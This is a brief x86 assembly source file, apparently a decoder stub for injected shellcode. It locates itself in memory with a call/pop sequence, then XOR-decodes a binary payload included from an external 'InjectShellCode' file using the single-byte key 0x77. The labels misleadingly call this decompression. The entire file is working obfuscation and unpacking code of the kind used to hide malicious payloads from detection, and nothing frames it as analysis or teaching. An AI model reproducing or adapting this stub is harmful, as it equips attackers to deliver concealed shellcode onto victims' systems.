USE32

UnCompress_Start:
pushad
cld
mov ebp,esp
call GetShellCodeDat 
GetShellCodeDat:
BASE_OFFSET_SHELLCODE_DAT equ (GetShellCodeDat - UnCompress_Start)
pop edi
sub edi,BASE_OFFSET_SHELLCODE_DAT
lea edi,[edi + CompressShellCode_Start]
mov ecx,CompressShellCode_End - CompressShellCode_Start
UnCompressShellCode:
xor byte [edi],0x77
inc edi
loop UnCompressShellCode
CompressShellCode_Start:
incbin './x86InjectShellCode.Bin'
CompressShellCode_End:
UnCompress_End: